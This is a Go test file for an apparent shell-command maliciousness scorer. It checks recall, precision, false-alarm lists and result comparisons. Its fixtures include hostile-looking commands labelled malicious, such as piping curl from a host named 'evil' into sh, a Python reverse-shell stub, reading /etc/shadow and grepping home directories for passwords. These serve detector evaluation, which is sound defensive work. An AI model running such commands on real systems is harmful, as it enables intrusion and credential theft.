package eval

import (
	"reflect"
	"strings"
	"testing"

	"exectrace/internal/types"
)

// vc builds a verdict with a command and band (and a verdict label matching the
// band) for the richer scorecard tests.
func vc(cmd, band string) types.Verdict {
	verdict := "benign"
	switch band {
	case types.BandHigh:
		verdict = "malicious"
	case types.BandGray:
		verdict = "suspicious"
	}
	return types.Verdict{Command: cmd, Band: band, Verdict: verdict, Score: 0.5}
}

// TestScorecardKnownFixture pins recall/precision/F1 on a hand-picked set:
// 3 TP, 1 FP, 2 FN  ->  recall = 3/5 = .6, precision = 3/4 = .75, f1 = .6667.
func TestScorecardKnownFixture(t *testing.T) {
	var s Scorer
	s.Observe(vc("nmap -sn 10.0.0.0/24", types.BandHigh), "malicious")     // TP
	s.Observe(vc("curl evil | sh", types.BandHigh), "malicious")           // TP
	s.Observe(vc("tar czf /tmp/x", types.BandGray), "suspicious")          // TP
	s.Observe(vc("ls -la", types.BandGray), "benign")                      // FP
	s.Observe(vc("grep -r password /home", types.BandLow), "malicious")    // FN
	s.Observe(vc("python3 -c rev.shell", types.BandLow), "malicious")      // FN

	if s.TP != 3 || s.FP != 1 || s.FN != 2 || s.TN != 0 {
		t.Fatalf("counts TP=%d FP=%d FN=%d TN=%d", s.TP, s.FP, s.FN, s.TN)
	}
	approx(t, "recall", s.Recall(), 0.6)
	approx(t, "precision", s.Precision(), 0.75)
	approx(t, "f1", s.F1(), 2*0.75*0.6/(0.75+0.6))
}

// TestFPFNExtraction checks the exact commands captured in the error lists.
func TestFPFNExtraction(t *testing.T) {
	var s Scorer
	s.Observe(vc("ls -la", types.BandGray), "benign")                   // FP
	s.Observe(vc("grep -r password /home", types.BandLow), "malicious") // FN
	s.Observe(vc("curl evil | sh", types.BandHigh), "malicious")        // TP, no list

	if len(s.FalseAlarms) != 1 || s.FalseAlarms[0].Command != "ls -la" {
		t.Errorf("false alarms = %+v", s.FalseAlarms)
	}
	if len(s.Misses) != 1 || s.Misses[0].Command != "grep -r password /home" {
		t.Errorf("misses = %+v", s.Misses)
	}
}

// TestBreakdowns checks per-verdict and per-band tallies.
func TestBreakdowns(t *testing.T) {
	var s Scorer
	s.Observe(vc("a", types.BandHigh), "malicious")
	s.Observe(vc("b", types.BandHigh), "malicious")
	s.Observe(vc("c", types.BandLow), "benign")

	if s.PerBand[types.BandHigh] != 2 || s.PerBand[types.BandLow] != 1 {
		t.Errorf("per-band = %v", s.PerBand)
	}
	if s.PerVerdict["malicious"] != 2 || s.PerVerdict["benign"] != 1 {
		t.Errorf("per-verdict = %v", s.PerVerdict)
	}
}

// TestResultRoundtrip checks the persisted Result captures the right shape.
func TestResultRoundtrip(t *testing.T) {
	var s Scorer
	s.Observe(vc("ls -la", types.BandGray), "benign")                   // FP
	s.Observe(vc("grep -r password /home", types.BandLow), "malicious") // FN
	r := s.Result("corpus.csv", "mockp2", "2026-06-22T00:00:00Z")

	if r.Dataset != "corpus.csv" || r.Scorer != "mockp2" {
		t.Errorf("labels: %+v", r)
	}
	if r.Totals.FP != 1 || r.Totals.FN != 1 {
		t.Errorf("totals: %+v", r.Totals)
	}
	if len(r.FP) != 1 || r.FP[0].Command != "ls -la" {
		t.Errorf("fp rows: %+v", r.FP)
	}
	if len(r.FN) != 1 || r.FN[0].Command != "grep -r password /home" {
		t.Errorf("fn rows: %+v", r.FN)
	}
}

func TestLoadTruthAndNormalize(t *testing.T) {
	in := `# comment
nmap   -sn   10.0.0.0/24

  cat /etc/shadow
# another comment
`
	ts, err := LoadTruth(strings.NewReader(in))
	if err != nil {
		t.Fatal(err)
	}
	if ts.Len() != 2 {
		t.Fatalf("len = %d, want 2 (blanks/comments skipped)", ts.Len())
	}
	// whitespace-normalized match: extra spaces in the corpus line still hit.
	if ts.Label("nmap -sn 10.0.0.0/24") != "malicious" {
		t.Error("normalized nmap should match")
	}
	if ts.Label("nmap    -sn  10.0.0.0/24") != "malicious" {
		t.Error("differently-spaced nmap should still match")
	}
	if ts.Label("ls -la") != "benign" {
		t.Error("unknown command should be benign")
	}
}

func TestNormalizeCmd(t *testing.T) {
	if got := NormalizeCmd("  a   b\tc  "); got != "a b c" {
		t.Errorf("got %q", got)
	}
}

func TestCompareDeltas(t *testing.T) {
	// Baseline A: caught nothing, missed two, one FP.
	a := Result{
		Scorer: "A", Recall: 0.0, Precision: 0.0, F1: 0.0,
		FN: []FlaggedRow{{Command: "nmap -sn 10.0.0.0/24"}, {Command: "cat /etc/shadow"}},
		FP: []FlaggedRow{{Command: "ls -la"}},
	}
	// New B: now catches nmap (so it leaves FN), no longer FPs ls, but newly FPs git.
	b := Result{
		Scorer: "B", Recall: 0.5, Precision: 0.5, F1: 0.5,
		FN: []FlaggedRow{{Command: "cat /etc/shadow"}},
		FP: []FlaggedRow{{Command: "git status"}},
	}
	d := Compare(a, b)
	approx(t, "Drecall", d.DRecall, 0.5)

	if !reflect.DeepEqual(d.NewlyCaught, []string{"nmap -sn 10.0.0.0/24"}) {
		t.Errorf("newly caught = %v", d.NewlyCaught)
	}
	if len(d.NewlyMissed) != 0 {
		t.Errorf("newly missed = %v", d.NewlyMissed)
	}
	if !reflect.DeepEqual(d.FPRemoved, []string{"ls -la"}) {
		t.Errorf("fp removed = %v", d.FPRemoved)
	}
	if !reflect.DeepEqual(d.FPAdded, []string{"git status"}) {
		t.Errorf("fp added = %v", d.FPAdded)
	}
}

func approx(t *testing.T, name string, got, want float64) {
	t.Helper()
	if got < want-1e-9 || got > want+1e-9 {
		t.Errorf("%s = %v, want %v", name, got, want)
	}
}
